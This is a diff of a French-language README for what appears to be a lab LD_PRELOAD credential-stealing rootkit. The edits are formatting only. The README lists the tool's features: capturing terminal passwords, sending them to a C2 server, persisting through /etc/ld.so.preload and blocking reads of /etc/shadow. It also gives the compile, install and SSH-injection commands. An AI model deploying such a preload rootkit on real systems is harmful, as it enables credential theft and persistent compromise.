@@ -88,9 +88,8 @@ Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload
 | -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | 🔑 Exfiltration de mot de passe  | Intercepte les entrées `password:` dans un terminal                                                                                                       |
 | 📦 Envoi vers serveur C2         | Format : `register <hostname> <mdp>`                                                                                                                      |
-| 🚫 Blocage de fichiers sensibles: Empêche `open()` sur sudo /etc/passwd`, `/etc/shadow`, etc. Exemple : `sudo cat /etc/passwd` → Permission denied▪️ ` cat /etc/passwd` → aussi bloqué |
-
-| 🧠 Injection automatique via SSH | Vous pouvez tester avec :<br>▪️ `LD_PRELOAD=./malware.so ssh name@192.168.1.xx`                                                                               |
+| 🚫 Blocage de fichiers sensibles: Empêche `open()` sur sudo /etc/passwd`, `/etc/shadow`, etc. Exemple : `sudo cat /etc/passwd` → Permission denied▪️ ` cat /etc/passwd` → aussi bloqué       |
+| 🧠 Injection automatique via SSH | Vous pouvez tester avec :<br>▪️ `LD_PRELOAD=./malware.so ssh name@192.168.1.xx`                                                                           |
 | 💾 Persistance dans BTree        | Chaque victime est stockée dans `database.db` avec ID unique                                                                                              |
 | 🔁 Injection persistante         | Automatique via `/etc/ld.so.preload`                                                                                   
 
@@ -116,11 +115,11 @@ Lancer le serveur C2 sur VM1 :
 Sur la VM malware, compiler et injecter :
 
 
-make
-chmod +x install_ldso_preload.sh
-sudo ./install_ldso_preload.sh
+make |
+chmod +x install_ldso_preload.sh|
+sudo ./install_ldso_preload.sh |
 Se connecter à une machine distante via SSH (ou exécuter sudo ls)
-exemple :
+exemple : |
 LD_PRELOAD=./malware.so ssh nom@192.168.1.xx (ip)
 
 
